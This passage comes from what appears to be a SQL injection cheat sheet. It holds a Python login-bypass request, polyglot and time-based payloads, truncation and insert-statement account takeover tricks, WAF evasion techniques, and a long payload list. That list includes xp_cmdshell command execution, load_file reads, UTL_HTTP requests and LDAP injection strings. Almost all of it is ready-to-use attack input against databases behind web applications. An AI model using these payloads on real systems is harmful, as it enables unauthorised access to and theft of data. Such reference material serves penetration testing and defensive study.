cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3') 
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"} 
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url}) 
print r.text
```

## Polyglot injection (multicontext)
```bash
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## Insert Statement
### Modify password of existing object/user
To do so you should try to create a new object named as the "master object" (probably admin in case of users) modifying something:
* Create user named: AdMIn (uppercase & lowercase letters)
* Create a user named: admin=
* SQL Truncation Attack (when there is some kind of length limit in the username or email) --> Create user with name: admin [a lot of spaces] a


## MySQL Insert time based checking
Add as much **','',''** as you consider to exit the VALUES statement. If delay is executed, you have a SQLInjection.
```bash
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```

## Extract information
**Creating 2 accounts at the same time**
When trying to create a new user and username, password and email are needed:
```bash
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```

## Routed SQL injection
Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output.
```bash
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```


## WAF Bypass
### No spaces bypass
No Space (%20) - bypass using whitespace alternatives
```bash
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
No Whitespace - bypass using comments
```bash
?id=1/*comment*/and/**/1=1/**/--
```
No Whitespace - bypass using parenthesis
```bash
?id=(1)and(1)=(1)--
```

### No commas bypass
No Comma - bypass using `OFFSET`, `FROM` and `JOIN`
```bash
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

### Generic Bypasses
Blacklist using keywords - bypass using uppercase/lowercase
```bash
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
Blacklist using keywords case insensitive - bypass using an equivalent operator
```bash
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```

### Scientific Notation WAF bypass
You can find a more in depth explaination of this trick in [gosecure blog](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).
Basically you can use the scientific notation in unexpected ways for the WAF to bypass it:
```bash
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```

### Bypass Column Names Restriction
First of all, notice that if the original query and the table where you want to extract the flag from have the same amount of columns you might just do: `0 UNION SELECT * FROM flag`

It’s possible to access the third column of a table without using its name using a query like the following: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, so in an sqlinjection this would looks like:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
Or using a comma bypass:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
This trick was taken from [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

## Tools
* [SQLMap](https://github.com/sqlmapproject/sqlmap)
* [WAF bypass suggester tools](https://github.com/m4ll0k/Atlas)

## Brute-Force Detection List
```bash
 or 1=1 --
 or 3=3 --
!
"
" OR "" = "
" OR 1 = 1 -- -
" and 0=benchmark(3000000,MD5(1))%20%23
" and 0=benchmark(3000000,MD5(1))%20--
" and 0=benchmark(3000000,MD5(1))%20/*
" or "a"="a
" or 0=0 --
" or 1=1--
" or benchmark(10000000,MD5(1))#
" or isNULL(1/0) /*
" or pg_sleep(5)--
" or pg_sleep(__TIME__)--
" or sleep(5)#
" or sleep(5)="
" or sleep(__TIME__)#
" or sleep(__TIME__)="
" waitfor delay '0:0:20' --
" waitfor delay '0:0:20' /*
""
")
") and 0=benchmark(3000000,MD5(1))%20%23
") and 0=benchmark(3000000,MD5(1))%20--
") and 0=benchmark(3000000,MD5(1))%20/*
") or benchmark(10000000,MD5(1))#
") or pg_sleep(5)--
") or pg_sleep(__TIME__)--
") or sleep(5)="
") or sleep(__TIME__)="
") waitfor delay '0:0:20' --
") waitfor delay '0:0:20' /*
"))
")) and 0=benchmark(3000000,MD5(1))%20%23
")) and 0=benchmark(3000000,MD5(1))%20--
")) and 0=benchmark(3000000,MD5(1))%20/*
")) or benchmark(10000000,MD5(1))#
")) or pg_sleep(5)--
")) or pg_sleep(__TIME__)--
")) or sleep(5)="
")) or sleep(__TIME__)="
")) waitfor delay '0:0:20' --
")) waitfor delay '0:0:20' /*
")))
"))) and 0=benchmark(3000000,MD5(1))%20%23
"))) and 0=benchmark(3000000,MD5(1))%20--
"))) and 0=benchmark(3000000,MD5(1))%20/*
"))) waitfor delay '0:0:20' --
"))) waitfor delay '0:0:20' /*
")))) and 0=benchmark(3000000,MD5(1))%20%23
")))) and 0=benchmark(3000000,MD5(1))%20--
")))) and 0=benchmark(3000000,MD5(1))%20/*
")))) waitfor delay '0:0:20' --
")))) waitfor delay '0:0:20' /*
"))))) waitfor delay '0:0:20' --
"))))) waitfor delay '0:0:20' /*
")))))) waitfor delay '0:0:20' --
")))))) waitfor delay '0:0:20' /*
"));waitfor delay '0:0:5'--
"));waitfor delay '0:0:__TIME__'--
");
");waitfor delay '0:0:5'--
");waitfor delay '0:0:__TIME__'--
";
";waitfor delay '0:0:5'--
";waitfor delay '0:0:__TIME__'--
"a"" or 1=1--"
"a"" or 3=3--"
"hi"") or (""a""=""a"
#	    Hash comment
# Numeric
# from wapiti
#NAME?
%		wildcard attribute indicator
%"
%")
%'
%' AND 8310=8310 AND '%'='
%' AND 8310=8311 AND '%'='
%')
%00
%20$(sleep%2050)
%20'sleep%2050'
%20or%20''='
%20or%20'x'='x
%20or%201=1
%20or%20x=x
%21
%26
%27%20or%201=1
%28
%29
%2A%28%7C%28mail%3D%2A%29%29
%2A%28%7C%28objectclass%3D%2A%29%29
%2A%7C
%2c(select%20*%20from%20(select(sleep(10)))a)
%7C
&
&&SLEEP(5)
&&SLEEP(5)#
&&SLEEP(5)--
&apos;%20OR
'
' (select top 1
' AND MID(VERSION(),1,1) = '5';
' AND id IS NULL; --
' AnD SLEEP(5) ANd '1
' GROUP BY columnnames having 1=1 --
' OR '' = '
' OR '1
' OR 'x'='x
' OR 1 -- -
' UNION ALL SELECT
' UNION SELECT
' UNION SELECT sum(columnname ) from tablename --
' and 0=benchmark(3000000,MD5(1))%20%23
' and 0=benchmark(3000000,MD5(1))%20--
' and 0=benchmark(3000000,MD5(1))%20/*
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
' or "
' or ''='
' or '1'='1'--
' or (EXISTS)
' or 0=0 #
' or 0=0 --
' or 1 --'
' or 1=1
' or 1=1 or ''='
' or 1=1--
' or 3=3
' or 3=3 --
' or a=a--
' or benchmark(10000000,MD5(1))#
' or pg_sleep(5)--
' or pg_sleep(__TIME__)--
' or sleep(5)#
' or sleep(5)='
' or sleep(__TIME__)#
' or sleep(__TIME__)='
' or uid like '%
' or uname like '%
' or user like '%
' or userid like '%
' or username like '%
' waitfor delay '0:0:20' --
' waitfor delay '0:0:20' /*
'"
'%20or%20''='
'%20or%20'x'='x
'%20or%201=1
'&&SLEEP(5)&&'1
''
'''''''''''''UNION SELECT '2
')
') and 0=benchmark(3000000,MD5(1))%20%23
') and 0=benchmark(3000000,MD5(1))%20--
') and 0=benchmark(3000000,MD5(1))%20/*
') or ('a'='a
') or benchmark(10000000,MD5(1))#
') or pg_sleep(5)--
') or pg_sleep(__TIME__)--
') or sleep(5)='
') or sleep(__TIME__)='
') waitfor delay '0:0:20' --
') waitfor delay '0:0:20' /*
')%20or%20('x'='x
'))
')) and 0=benchmark(3000000,MD5(1))%20%23
')) and 0=benchmark(3000000,MD5(1))%20--
')) and 0=benchmark(3000000,MD5(1))%20/*
')) or benchmark(10000000,MD5(1))#
')) or pg_sleep(5)--
')) or pg_sleep(__TIME__)--
')) or sleep(5)='
')) or sleep(__TIME__)='
')) waitfor delay '0:0:20' --
')) waitfor delay '0:0:20' /*
'))) and 0=benchmark(3000000,MD5(1))%20%23
'))) and 0=benchmark(3000000,MD5(1))%20--
'))) and 0=benchmark(3000000,MD5(1))%20/*
'))) waitfor delay '0:0:20' --
'))) waitfor delay '0:0:20' /*
')))) and 0=benchmark(3000000,MD5(1))%20%23
')))) and 0=benchmark(3000000,MD5(1))%20--
')))) and 0=benchmark(3000000,MD5(1))%20/*
')))) waitfor delay '0:0:20' --
')))) waitfor delay '0:0:20' /*
'))))) waitfor delay '0:0:20' --
'))))) waitfor delay '0:0:20' /*
')))))) waitfor delay '0:0:20' --
')))))) waitfor delay '0:0:20' /*
'));waitfor delay '0:0:5'--
'));waitfor delay '0:0:__TIME__'--
');waitfor delay '0:0:5'--
');waitfor delay '0:0:__TIME__'--
';
'; exec master..xp_cmdshell
'; exec master..xp_cmdshell 'ping 172.10.1.255'--
'; exec xp_regread
';WAITFOR DELAY '0:0:30'--
';waitfor delay '0:0:5'--
';waitfor delay '0:0:__TIME__'--
'='
'=0--+
'LIKE'
'\"
'hi' or 'x'='x';
'sqlattempt1
'||UTL_HTTP.REQUEST
(
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
(select top 1
(sqlattempt2)
(sqlvuln)
(||6)
)
) and 0=benchmark(3000000,MD5(1))%20%23
) and 0=benchmark(3000000,MD5(1))%20--
) and 0=benchmark(3000000,MD5(1))%20/*
) or ('a'='a
) or (a=a
) or benchmark(10000000,MD5(1))#
) or benchmark(10000000,MD5(1))#"
) or pg_sleep(__TIME__)--
) or sleep(__TIME__)=
) or sleep(__TIME__)='
) union select * from information_schema.tables;
) waitfor delay '0:0:20' --
) waitfor delay '0:0:20' /*
)%20or%20('x'='x
)) and 0=benchmark(3000000,MD5(1))%20%23
)) and 0=benchmark(3000000,MD5(1))%20--
)) and 0=benchmark(3000000,MD5(1))%20/*
)) or benchmark(10000000,MD5(1))#
)) or pg_sleep(__TIME__)--
)) or pg_sleep(__TIME__)--"
)) or sleep(__TIME__)="""
)) or sleep(__TIME__)='
)) waitfor delay '0:0:20' --
)) waitfor delay '0:0:20' /*
))) and 0=benchmark(3000000,MD5(1))%20%23
))) and 0=benchmark(3000000,MD5(1))%20--
))) and 0=benchmark(3000000,MD5(1))%20/*
))) waitfor delay '0:0:20' --
))) waitfor delay '0:0:20' /*
)))) and 0=benchmark(3000000,MD5(1))%20%23
)))) and 0=benchmark(3000000,MD5(1))%20--
)))) and 0=benchmark(3000000,MD5(1))%20/*
)))) waitfor delay '0:0:20' --
)))) waitfor delay '0:0:20' /*
))))) waitfor delay '0:0:20' --
)))))) waitfor delay '0:0:20' --
));waitfor delay '0:0:5'--
));waitfor delay '0:0:__TIME__'--
);waitfor delay '0:0:5'--
);waitfor delay '0:0:__TIME__'--
*(|(mail=*))
*(|(objectclass=*))
*/*
*|
+		addition, concatenate (or space in url)
+ SLEEP(10) + '
+benchmark(3200,SHA1(1))+'
+sqlvuln
,
,(select * from (select(sleep(10)))a)
,@variable
--
-- &password=
-- -	SQL comment
-- or #
--sp_password
-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@
-1' UNION SELECT 1,2,3--+
-2
/
/*  	C-style comment
/**/or/**/1/**/=/**/1
/*…*/
//
//*
0
0 or 1=1
0x730065006c0065006300740020004000400076006500 ...
0x770061006900740066006F0072002000640065006C00 ...
0x77616974666F722064656C61792027303A303A313027 ...
1 AND (SELECT * FROM Users) = 1
1 or 1=1
1 or benchmark(10000000,MD5(1))#
1 or pg_sleep(5)--
1 or pg_sleep(__TIME__)--
1 or sleep(5)#
1 or sleep(__TIME__)#
1 waitfor delay '0:0:10'--
1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
1' ORDER BY 1,2,3--+
1' ORDER BY 1,2--+
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1) or benchmark(10000000,MD5(1))#
1) or pg_sleep(5)--
1) or pg_sleep(__TIME__)--
1) or sleep(5)#
1) or sleep(__TIME__)#
1)) or benchmark(10000000,MD5(1))#
1)) or pg_sleep(5)--
1)) or pg_sleep(__TIME__)--
1)) or sleep(5)#
1)) or sleep(__TIME__)#
1*56
1-false
1-true
1;(load_file(char(47,101,116,99,47,112,97,115, ...
1;SELECT%20*
21 %
21%
23 OR 1=1
26 %
26%
28 %
28%
29 %
29%
3.10E+17
;
; begin declare @var varchar(8000) set @var=' ...
; exec ('sel' + 'ect us' + 'er')
; exec master..xp_cmdshell
; exec master..xp_cmdshell 'ping 172.10.1.255'--
; exec xp_regread
; execute immediate 'sel' || 'ect us' || 'er'
; or '1'='1'
;%00	Nullbyte
;waitfor delay '0:0:5'--
;waitfor delay '0:0:__TIME__'--
<>"'%;)(&+
?
@@variable	global variable
@var select @var as var into temp end --
@variable
@variable	local variable
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
AND 0
AND 1
AND 1083=1083 AND ('1427=1427
AND 1083=1083 AND (1427=1427
AND 1=0
AND 1=0 AND '%'='
AND 1=0#
AND 1=0--
AND 1=1
AND 1=1 AND '%'='
AND 1=1#
AND 1=1--
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)
AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--
AND 7300=7300 AND 'pKlZ'='pKlY
AND 7300=7300 AND 'pKlZ'='pKlZ
AND 7300=7300 AND ('pKlZ'='pKlY
AND 7300=7300 AND ('pKlZ'='pKlZ
AND 7506=9091 AND ('5913=5913
AND 7506=9091 AND (5913=5913
AND false
AND true
AS INJECTX WHERE 1=1 AND 1=0
AS INJECTX WHERE 1=1 AND 1=0#
AS INJECTX WHERE 1=1 AND 1=0--
AS INJECTX WHERE 1=1 AND 1=1
AS INJECTX WHERE 1=1 AND 1=1#
AS INJECTX WHERE 1=1 AND 1=1--
AnD SLEEP(5)
AnD SLEEP(5)#
AnD SLEEP(5)--
Comments:
Finding the table name
HAVING 1=0
HAVING 1=0#
HAVING 1=0--
HAVING 1=1
HAVING 1=1#
HAVING 1=1--
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/
OR 1=0
OR 1=0#
OR 1=0--
OR 1=1
OR 1=1#
OR 1=1--
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
OR 3409=3409 AND ('pytW' LIKE 'pytW
OR 3409=3409 AND ('pytW' LIKE 'pytY
OR x=x
OR x=x#
OR x=x--
OR x=y
OR x=y#
OR x=y--
ORDER BY 1
ORDER BY 1#
ORDER BY 1,SLEEP(5)
ORDER BY 1,SLEEP(5)#
ORDER BY 1,SLEEP(5),3#
ORDER BY 1,SLEEP(5),3,4#
ORDER BY 1,SLEEP(5),3,4--
ORDER BY 1,SLEEP(5),3--
